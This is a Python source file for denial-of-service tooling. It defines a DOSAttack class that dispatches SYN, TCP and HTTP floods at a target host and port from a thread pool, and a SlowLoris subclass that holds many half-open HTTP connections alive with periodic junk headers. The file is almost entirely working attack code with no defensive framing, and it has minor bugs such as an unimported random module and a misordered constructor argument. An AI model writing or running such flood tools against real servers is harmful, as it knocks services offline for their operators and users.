import time
from typing import Tuple
from concurrent.futures import ThreadPoolExecutor
from network import NetworkManager

class DOSAttack:
    """Class to manage DoS attack methods."""
    def __init__(self, target: str, port: int, method: str = "syn", packet_type: str = "tcp", threads: int = 100):
        self.target = (target, port)
        self.method = method.lower()
        self.threads = threads
        self.running = False
        self.network = NetworkManager()
        self.attack_count = 0
        self.start_time = 0

    def start_attack(self) -> None:
        """Start the DOS attack with specified method"""
        self.running = True
        self.start_time = time.time()
        
        print(f"[*] Starting {self.method.upper()} flood attack on {self.target[0]}:{self.target[1]}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            while self.running:
                if self.method == "syn":
                    executor.submit(self.network.syn_flood, self.target)
                elif self.method == "tcp":
                    executor.submit(self.network.send_tcp_flood, self.target)
                elif self.method == "http":
                    url = f"http://{self.target[0]}:{self.target[1]}"
                    executor.submit(self.network.http_flood, url)
                
                self.attack_count += 1
                if self.attack_count % 1000 == 0:
                    self.print_stats()

    def stop_attack(self) -> None:
        """Stop the ongoing attack"""
        self.running = False
        self.print_stats()

    def print_stats(self) -> None:
        """Print attack statistics"""
        duration = time.time() - self.start_time
        rate = self.attack_count / duration
        print(f"[+] Packets sent: {self.attack_count}")
        print(f"[+] Duration: {duration:.2f} seconds")
        print(f"[+] Rate: {rate:.2f} packets/second")

class SlowLoris(DOSAttack):
    def __init__(self, target: str, port: int = 80, threads: int = 150):
        super().__init__(target, port, "slowloris", threads)
        self.sockets = []

    def start_attack(self) -> None:
        """Start Slowloris attack"""
        self.running = True
        self.start_time = time.time()
        
        print(f"[*] Starting Slowloris attack on {self.target[0]}:{self.target[1]}")
        
        while self.running:
            try:
                for _ in range(self.threads):
                    s = self.network.create_socket()
                    if s:
                        s.connect(self.target)
                        s.send(b"GET / HTTP/1.1\r\n")
                        s.send(b"Host: " + self.target[0].encode() + b"\r\n")
                        s.send(b"User-Agent: " + random.choice(self.network.user_agents).encode() + b"\r\n")
                        self.sockets.append(s)
                        self.attack_count += 1
                
                # Keep sockets alive
                for s in self.sockets:
                    try:
                        s.send(b"X-a: " + str(random.randint(1, 5000)).encode() + b"\r\n")
                    except:
                        self.sockets.remove(s)
                        s = self.network.create_socket()
                        if s:
                            s.connect(self.target)
                            self.sockets.append(s)
                
                if self.attack_count % 100 == 0:
                    self.print_stats()
                    
                time.sleep(15)
            except:
                pass

    def stop_attack(self) -> None:
        """Stop Slowloris attack and clean up"""
        self.running = False
        for s in self.sockets:
            try:
                s.close()
            except:
                pass
        self.print_stats()
